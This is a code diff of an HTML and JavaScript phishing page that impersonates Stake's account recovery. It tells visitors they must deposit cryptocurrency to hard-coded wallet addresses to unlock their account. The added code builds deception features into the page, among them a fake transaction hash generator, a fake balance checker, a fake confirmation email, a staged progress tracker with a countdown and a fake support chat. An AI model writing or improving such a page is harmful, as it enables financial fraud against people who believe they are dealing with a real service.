@@ -6,20 +6,150 @@
   <title>Stake Account Recovery</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    /* ... [Your Existing CSS, Unchanged] ... */
-
+    /* Basic Reset & Fonts */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+    body {
+      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
+      color: #ffffff;
+      min-height: 100vh;
+      overflow: auto;
+      transition: background 0.3s, color 0.3s;
+      position: relative;
+      padding-bottom: 100px; /* For floating elements */
+    }
+    /* Light Theme (hidden by default) */
+    body.light-theme {
+      background: #f3f3f3;
+      color: #333;
+    }
+    
+    /* Scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #02dc05;
+      border-radius: 4px;
+    }
+    
+    /* Container */
+    .container {
+      background: rgba(47, 69, 83, 0.9);
+      backdrop-filter: blur(8px);
+      padding: 25px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
+      width: 90%;
+      max-width: 480px;
+      margin: 40px auto;
+      position: relative;
+      z-index: 1;
+    }
+    
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+      position: relative;
+    }
+    .header img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+    .header h2 {
+      color: #02dc05;
+      font-size: 1.8rem;
+      font-weight: 600;
+    }
+    /* Theme Toggle Button */
+    #themeToggle {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: #02dc05;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      color: #0f212e;
+    }
+    
+    /* Form Groups */
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      font-weight: 500;
+      margin-bottom: 6px;
+      display: block;
+      color: #ffffff;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      background: #11232f;
+      border: 2px solid transparent;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 0.95rem;
+      transition: border 0.3s;
+    }
+    input:focus, select:focus {
+      border: 2px solid #02dc05;
+      outline: none;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #02dc05;
+      color: #0f212e;
+      font-weight: bold;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
+    }
+    button:disabled {
+      background: #555;
+      color: #aaa;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .copy-btn, #saveQRBtn, #checkBalanceBtn {
+      background-color: #166ae0;
+      color: #fff;
+    }
+    
+    /* Helper Text */
+    .helper-text {
+      font-size: 0.8rem;
+      color: #02dc05;
+      margin-top: 4px;
+    }
+    
+    /* QR Code Section */
     #qrcode {
       display: none;
       margin-top: 15px;
       text-align: center;
+      cursor: pointer;
     }
-
     #qrcode canvas {
       border-radius: 8px;
     }
-
     #saveQRBtn {
       margin-top: 10px;
+      display: none;
       background-color: #02dc05;
       color: #0f212e;
       font-weight: bold;
@@ -28,13 +158,160 @@
       border-radius: 8px;
       cursor: pointer;
     }
-
     #saveQRBtn:hover {
       box-shadow: 0 0 10px #02dc05;
+    }
+    
+    /* Screenshot Preview */
+    #screenshotPreview {
+      margin-top: 10px;
+      max-width: 100%;
+      max-height: 150px;
+      display: block;
+      border: 2px solid #02dc05;
+      border-radius: 8px;
+    }
+    
+    /* Popup Modal */
+    #popup, #qrModal, #emailPreview {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: rgba(47, 69, 83, 0.95);
+      color: #fff;
+      padding: 25px;
+      border-radius: 14px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      z-index: 9999;
+      animation: fadeIn 0.4s ease;
+      max-width: 90%;
+      text-align: center;
+    }
+    #popup p, #emailPreview p {
+      font-size: 1rem;
+      color: #ffdc00;
+      font-weight: 500;
+      margin-bottom: 15px;
+    }
+    /* Deposit Tracker Bar */
+    .tracker {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 15px;
+      margin-bottom: 15px;
+    }
+    .tracker-step {
+      width: 30%;
+      height: 8px;
+      background: #555;
+      border-radius: 4px;
+      position: relative;
+    }
+    .tracker-step.active {
+      background: #02dc05;
+    }
+    .tracker-step::after {
+      content: '';
+      position: absolute;
+      top: -4px;
+      right: -4px;
+      width: 16px;
+      height: 16px;
+      background: #02dc05;
+      border-radius: 50%;
+      display: none;
+    }
+    .tracker-step.active::after {
+      display: block;
+    }
+    
+    /* Toast Notification */
+    #toast-container {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      z-index: 10000;
+    }
+    .toast {
+      background: rgba(2, 220, 5, 0.9);
+      color: #0f212e;
+      padding: 10px 20px;
+      margin-top: 10px;
+      border-radius: 8px;
+      opacity: 0;
+      animation: fadeInOut 3s forwards;
+    }
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateY(20px); }
+      10%, 90% { opacity: 1; transform: translateY(0); }
+      100% { opacity: 0; transform: translateY(20px); }
+    }
+    
+    /* Blur effect for background on modal */
+    .blur {
+      filter: blur(5px);
+      pointer-events: none;
+      user-select: none;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
+      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
+    }
+    
+    /* Live Chat Box */
+    #liveChatIcon {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background: #02dc05;
+      color: #0f212e;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 10000;
+      box-shadow: 0 0 10px #02dc05;
+    }
+    #liveChatBox {
+      display: none;
+      position: fixed;
+      bottom: 80px;
+      left: 20px;
+      background: rgba(47, 69, 83, 0.95);
+      color: #fff;
+      padding: 15px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      z-index: 10000;
+      max-width: 300px;
+      text-align: left;
+    }
+    #liveChatBox h4 {
+      margin-bottom: 10px;
+      color: #02dc05;
+    }
+    #liveChatClose {
+      background: #166ae0;
+      border: none;
+      color: #fff;
+      padding: 4px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      float: right;
     }
   </style>
 </head>
 <body>
+  <!-- Theme Toggle Button -->
+  <button id="themeToggle">Toggle Theme</button>
+  
   <div id="main-content" class="container">
     <div class="header">
       <img src="stake-logo-white.png" alt="Stake Logo" />
@@ -71,16 +348,20 @@
       </select>
     </div>
 
-    <!-- Wallet Address + QR -->
+    <!-- Wallet Address, QR, Wallet Checker and Helper Text -->
     <div class="form-group">
       <label for="address">Wallet Address</label>
       <input type="text" id="address" readonly />
-      <button class="copy-btn" onclick="copyAddress()">Copy</button>
-
+      <div style="margin-top:8px; display: flex; gap:10px;">
+        <button class="copy-btn" onclick="copyAddress()">Copy</button>
+        <button id="checkBalanceBtn" onclick="checkBalance()">Check Balance</button>
+      </div>
+      <div id="addressHelper" class="helper-text"></div>
+      
       <!-- QR Code Display -->
-      <div id="qrcode"></div>
+      <div id="qrcode" onclick="openQRModal()"></div>
       <div style="text-align:center;">
-        <button id="saveQRBtn" onclick="saveQRCode()" style="display:none;">Save QR</button>
+        <button id="saveQRBtn" onclick="saveQRCode()">Save QR</button>
       </div>
     </div>
 
@@ -90,25 +371,63 @@
       <input type="number" id="amount" />
     </div>
 
-    <!-- Screenshot Upload -->
+    <!-- Screenshot Upload & Preview -->
     <div class="form-group">
       <label for="screenshot">Upload Screenshot</label>
-      <input type="file" id="screenshot" />
+      <input type="file" id="screenshot" accept="image/*" onchange="previewScreenshot(event)" />
+      <img id="screenshotPreview" src="" alt="Screenshot Preview" style="display:none;" />
+      <div id="txHash" class="helper-text"></div>
     </div>
 
     <!-- Submit -->
     <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
+    
+    <!-- Deposit Status Tracker (hidden, will show on submission) -->
+    <div id="depositTracker" style="display:none; margin-top:15px;">
+      <div class="tracker">
+        <div id="step1" class="tracker-step active"></div>
+        <div id="step2" class="tracker-step"></div>
+        <div id="step3" class="tracker-step"></div>
+      </div>
+      <div id="trackerMsg" style="font-size:0.9rem; color:#02dc05;">Verifying...</div>
+    </div>
   </div>
 
-  <!-- Popup -->
+  <!-- Popup Modal for Submission with Countdown -->
   <div id="popup">
-    <p>Your account recovery request has been successfully received. We have forwarded your request to the Stake technical team for prompt action. Your Stake account will be fully reactivated within 24 to 72 hours.</p>
+    <p>Your account recovery request has been received.<br>Please wait while we process your request.</p>
+    <div id="countdownTimer" style="font-size:1.2rem; margin:10px 0;"></div>
     <button onclick="location.reload()">OK</button>
   </div>
-
+  
+  <!-- QR Preview Modal -->
+  <div id="qrModal">
+    <h3>QR Code Preview</h3>
+    <div id="qrModalContent"></div>
+    <button onclick="closeQRModal()">Close</button>
+  </div>
+  
+  <!-- Email Preview Modal (Fake confirmation email) -->
+  <div id="emailPreview">
+    <h3>Email Confirmation</h3>
+    <p>Your account recovery request has been successfully submitted and is under review. Please check your email for further instructions.</p>
+    <button onclick="closeEmailPreview()">Close</button>
+  </div>
+  
+  <!-- Toast Notification Container -->
+  <div id="toast-container"></div>
+  
+  <!-- Live Chat Icon & Box -->
+  <div id="liveChatIcon" onclick="toggleChatBox()">💬</div>
+  <div id="liveChatBox">
+    <button id="liveChatClose" onclick="toggleChatBox()">Close</button>
+    <h4>Stake Support</h4>
+    <p>You are now connected with our technical team. How can we help you?</p>
+  </div>
+  
   <!-- QR Code Library -->
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
-
+  
   <!-- JS Logic -->
   <script>
     const addressMap = {
@@ -127,31 +446,51 @@
         bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
       }
     };
-
+    
+    function showToast(message) {
+      const toastContainer = document.getElementById('toast-container');
+      const toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.innerText = message;
+      toastContainer.appendChild(toast);
+      // Remove toast after animation
+      setTimeout(() => {
+        toastContainer.removeChild(toast);
+      }, 3000);
+    }
+    
     function verifyUsername() {
       const msg = document.getElementById('verify-msg');
       msg.innerHTML = 'Verifying...';
       setTimeout(() => {
         msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required. This amount will be safely credited to your Stake account, ensuring the security and protection of your funds.';
+        showToast("Username verified");
       }, 1500);
+      vibrateDevice();
     }
-
+    
     function updateAddress() {
       const coin = document.getElementById('coin').value;
       const network = document.getElementById('network').value;
       const addressField = document.getElementById('address');
       const qrContainer = document.getElementById('qrcode');
       const saveBtn = document.getElementById('saveQRBtn');
-
+      const helperText = document.getElementById('addressHelper');
+      
       if (coin && network && addressMap[coin] && addressMap[coin][network]) {
         const addr = addressMap[coin][network];
         addressField.value = addr;
-
-        // Clear old QR
+        
+        // Show helper for USDT-TRC20
+        if(coin === 'usdt' && network === 'trc20'){
+          helperText.innerText = "Recommended for fastest processing.";
+        } else {
+          helperText.innerText = "";
+        }
+        
+        // Clear old QR & generate new QR
         qrContainer.innerHTML = '';
-
-        // Generate new QR
-        const qr = new QRCode(qrContainer, {
+        new QRCode(qrContainer, {
           text: addr,
           width: 150,
           height: 150,
@@ -159,26 +498,26 @@
           colorLight: "#0f212e",
           correctLevel: QRCode.CorrectLevel.H
         });
-
         qrContainer.style.display = 'block';
         saveBtn.style.display = 'inline-block';
       } else {
         addressField.value = '';
         qrContainer.style.display = 'none';
         saveBtn.style.display = 'none';
+        helperText.innerText = "";
       }
-
       checkForm();
     }
-
+    
     function copyAddress() {
       const address = document.getElementById('address');
       address.select();
       address.setSelectionRange(0, 99999);
       navigator.clipboard.writeText(address.value);
-      alert('Address copied!');
+      showToast("Address copied!");
+      vibrateDevice();
     }
-
+    
     function checkForm() {
       const username = document.getElementById('username').value;
       const coin = document.getElementById('coin').value;
@@ -189,22 +528,121 @@
       const btn = document.getElementById('submitBtn');
       btn.disabled = !(username && coin && network && address && amount && screenshot);
     }
-
+    
     document.querySelectorAll('input, select').forEach(input => {
       input.addEventListener('change', checkForm);
     });
-
+    
     function submitForm() {
+      // Lock form inputs
+      document.querySelectorAll('input, select, button').forEach(el => el.disabled = true);
       document.getElementById('main-content').classList.add('blur');
-      document.getElementById('popup').style.display = 'block';
+      document.getElementById('depositTracker').style.display = 'block';
+      startDepositTracker();
+      vibrateDevice();
     }
-
+    
+    // Deposit Tracker with Countdown Timer
+    function startDepositTracker() {
+      let countdown = 30; // seconds
+      const countdownTimer = document.getElementById('countdownTimer');
+      countdownTimer.innerText = countdown + " seconds remaining";
+      const interval = setInterval(() => {
+        countdown--;
+        countdownTimer.innerText = countdown + " seconds remaining";
+        updateTracker(countdown);
+        if(countdown <= 0) {
+          clearInterval(interval);
+          document.getElementById('popup').style.display = 'block';
+        }
+      }, 1000);
+    }
+    
+    function updateTracker(secondsLeft) {
+      // Simple simulation: divide into 3 steps
+      if(secondsLeft > 20) {
+        document.getElementById('step1').classList.add('active');
+        document.getElementById('trackerMsg').innerText = "Verifying...";
+      } else if(secondsLeft > 10) {
+        document.getElementById('step2').classList.add('active');
+        document.getElementById('trackerMsg').innerText = "Processing...";
+      } else {
+        document.getElementById('step3').classList.add('active');
+        document.getElementById('trackerMsg').innerText = "Finalizing...";
+      }
+    }
+    
     function saveQRCode() {
       const qrCanvas = document.querySelector("#qrcode canvas");
-      const link = document.createElement("a");
-      link.href = qrCanvas.toDataURL("image/png");
-      link.download = "wallet-qr.png";
-      link.click();
+      if(qrCanvas) {
+        const link = document.createElement("a");
+        link.href = qrCanvas.toDataURL("image/png");
+        link.download = "wallet-qr.png";
+        link.click();
+        showToast("QR saved!");
+        vibrateDevice();
+      }
+    }
+    
+    // QR Preview Modal functions
+    function openQRModal() {
+      const qrModal = document.getElementById('qrModal');
+      const qrContainer = document.getElementById('qrcode');
+      const qrModalContent = document.getElementById('qrModalContent');
+      qrModalContent.innerHTML = qrContainer.innerHTML; // clone current QR
+      qrModalContent.querySelector("canvas").width = 250;
+      qrModalContent.querySelector("canvas").height = 250;
+      qrModal.style.display = 'block';
+    }
+    
+    function closeQRModal() {
+      document.getElementById('qrModal').style.display = 'none';
+    }
+    
+    // Fake Wallet Checker
+    function checkBalance() {
+      showToast("Unable to fetch balance. Please try again after confirmation.");
+      vibrateDevice();
+    }
+    
+    // Preview Screenshot & Fake Transaction Hash Generator
+    function previewScreenshot(event) {
+      const file = event.target.files[0];
+      const preview = document.getElementById('screenshotPreview');
+      const txHashDiv = document.getElementById('txHash');
+      if(file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          preview.src = e.target.result;
+          preview.style.display = 'block';
+        }
+        reader.readAsDataURL(file);
+        // Generate fake transaction hash
+        txHashDiv.innerText = "Transaction Hash: 0x" + Math.random().toString(16).substr(2, 20);
+      } else {
+        preview.style.display = 'none';
+        txHashDiv.innerText = "";
+      }
+    }
+    
+    // Theme Toggle
+    document.getElementById('themeToggle').addEventListener('click', function() {
+      document.body.classList.toggle('light-theme');
+      showToast("Theme toggled");
+    });
+    
+    // Live Chat Toggle
+    function toggleChatBox() {
+      const chatBox = document.getElementById('liveChatBox');
+      chatBox.style.display = (chatBox.style.display === 'block') ? 'none' : 'block';
+      vibrateDevice();
+    }
+    
+    // Mobile Haptic Vibration (if supported)
+    function vibrateDevice() {
+      if(navigator.vibrate) {
+        navigator.vibrate(50);
+      }
     }
   </script>
 </body>
